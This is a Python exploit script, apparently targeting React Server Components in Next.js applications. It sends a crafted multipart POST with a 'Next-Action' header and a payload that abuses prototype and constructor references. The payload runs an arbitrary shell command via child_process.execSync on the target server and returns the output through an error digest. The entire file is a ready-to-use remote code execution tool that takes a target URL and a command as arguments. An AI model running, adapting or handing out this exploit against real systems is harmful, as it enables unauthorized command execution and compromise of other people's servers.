#!/usr/bin/env python3
import sys
import json
import urllib.request
import urllib.error

if len(sys.argv) < 3:
    print(f"Usage: {sys.argv[0]} <target_url> <command>")
    sys.exit(1)

target = sys.argv[1].rstrip("/") + "/"
cmd = sys.argv[2]

# Akhiri dengan // karena React akan menambahkan Blob id setelah _prefix.
js = (
    "var res = process.mainModule.require('child_process')"
    f".execSync({cmd!r}, {{timeout: 5000}}).toString();"
    "throw Object.assign(new Error('NEXT_REDIRECT'), {digest: res});"
    "//"
)

payload = {
    "then": "$1:__proto__:then",
    "status": "resolved_model",
    "reason": -1,
    "value": "{\"then\":\"$B1337\"}",
    "_response": {
        "_prefix": js,
        "_formData": {
            "get": "$1:constructor:constructor"
        }
    }
}

boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"

def field(name, value):
    return (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="{name}"\r\n\r\n'
        f"{value}\r\n"
    ).encode()

body = b"".join([
    field("0", json.dumps(payload, separators=(",", ":"))),
    field("1", "\"$@0\""),
    f"--{boundary}--\r\n".encode(),
])

req = urllib.request.Request(
    target,
    data=body,
    method="POST",
    headers={
        "User-Agent": "Mozilla/5.0",
        "Next-Action": "x",
        "Content-Type": f"multipart/form-data; boundary={boundary}",
    },
)

try:
    with urllib.request.urlopen(req, timeout=15) as resp:
        print(f"[status] {resp.status}")
        print("[headers]")
        for k, v in resp.headers.items():
            if k.lower() in ["x-action-redirect", "location", "content-type"]:
                print(f"{k}: {v}")
        print("[body]")
        print(resp.read().decode("utf-8", "replace")[:5000])

except urllib.error.HTTPError as e:
    print(f"[status] {e.code}")
    print("[headers]")
    for k, v in e.headers.items():
        if k.lower() in ["x-action-redirect", "location", "content-type"]:
            print(f"{k}: {v}")
    print("[body]")
    print(e.read().decode("utf-8", "replace")[:5000])
